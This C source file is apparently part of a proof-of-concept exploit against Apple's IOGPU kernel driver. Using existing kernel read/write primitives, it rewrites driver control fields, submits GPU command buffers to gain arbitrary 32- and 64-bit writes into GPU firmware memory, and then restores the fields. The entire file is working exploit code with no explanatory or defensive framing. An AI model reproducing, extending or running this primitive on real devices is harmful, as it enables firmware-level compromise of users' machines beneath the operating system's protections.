#include "gfx.h"
#include "IOGPUDevice.h"
#include "offsets.h"
#include "poc.h"
#include "target.h"

#include <libkextrw.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static bool is_gfx_address(uint64_t address)
{
    return (address & 0xffffff0000000000ULL) ==
        0xfffffc0000000000ULL;
}

static bool is_control_slot(uint64_t address, size_t size)
{
    return (size == sizeof(uint64_t) &&
            (address == gPoc.device + DEVICE_MDSID_MAP ||
             address == gPoc.drop_map + MAP_GPU_BASE)) ||
        (size == sizeof(uint32_t) &&
         address == gPoc.iogpu + gTarget->drop_counter) ||
        (size == sizeof(uint16_t) &&
         address == gPoc.mdsid_table);
}

static bool control_write(uint64_t address, const void *value, size_t size)
{
    uint8_t observed[sizeof(uint64_t)] = {0};
    if (size == 0 || size > sizeof(observed) ||
        address > UINT64_MAX - size || !is_control_slot(address, size) ||
        kwritebuf(address, (void *)value, size) != KERN_SUCCESS ||
        kreadbuf(address, observed, size) != KERN_SUCCESS) {
        return false;
    }
    return memcmp(observed, value, size) == 0;
}

static bool control_write32(uint64_t address, uint32_t value)
{
    return control_write(address, &value, sizeof(value));
}

static bool control_write64(uint64_t address, uint64_t value)
{
    return control_write(address, &value, sizeof(value));
}

int gfx_write32(uint64_t address, uint32_t value)
{
    uint16_t mdsid = 0x100;
    if (!is_gfx_address(address) || address < gPoc.gpu_offset ||
        !control_write(gPoc.mdsid_table, &mdsid,
                       sizeof(mdsid))) return -1;

    uint64_t map_slot = gPoc.device + DEVICE_MDSID_MAP;
    uint64_t base_slot = gPoc.drop_map + MAP_GPU_BASE;
    uint64_t counter_slot = gPoc.iogpu + gTarget->drop_counter;
    uint64_t original_map = kread64(map_slot);
    uint64_t original_base = kread64(base_slot);
    uint32_t original_counter = kread32(counter_slot);

    bool armed = control_write64(map_slot, gPoc.mdsid_table) &&
        control_write32(counter_slot, value - 0x100) &&
        control_write64(base_slot, address - gPoc.gpu_offset) &&
        kread32(gPoc.iogpu + gTarget->dsids_supported) != 0;

    int submitted = armed ? IOGPU_submit_command_buffers() : -1;
    bool completed = false;
    uint32_t observed_counter = value - 0x100;
    for (unsigned i = 0; submitted == 0 && i < 5000; i++) {
        observed_counter = kread32(counter_slot);
        if (observed_counter == value) {
            completed = true;
            break;
        }
        usleep(1000);
    }

    bool drained = completed &&
        IOGPU_wait_device_control_idle(1) == 0;
    if (completed) usleep(10000);

    bool base_restored = control_write64(base_slot, original_base);
    bool counter_restored = control_write32(counter_slot, original_counter);
    bool map_restored = control_write64(map_slot, original_map);
    bool restored = base_restored && counter_restored && map_restored;
    printf("firmware target=0x%016llx value=0x%08x armed=%u "
           "submit=%d counter=0x%08x completed=%u drained=%u "
           "restored=%u\n",
           address, value, armed, submitted, observed_counter,
           completed, drained, restored);
    return submitted == 0 && completed && drained && restored ? 0 : -1;
}

int gfx_write64(uint64_t address, uint64_t value)
{
    return gfx_write32(address + sizeof(uint32_t),
                       (uint32_t)(value >> 32)) == 0 &&
        gfx_write32(address, (uint32_t)value) == 0 ? 0 : -1;
}
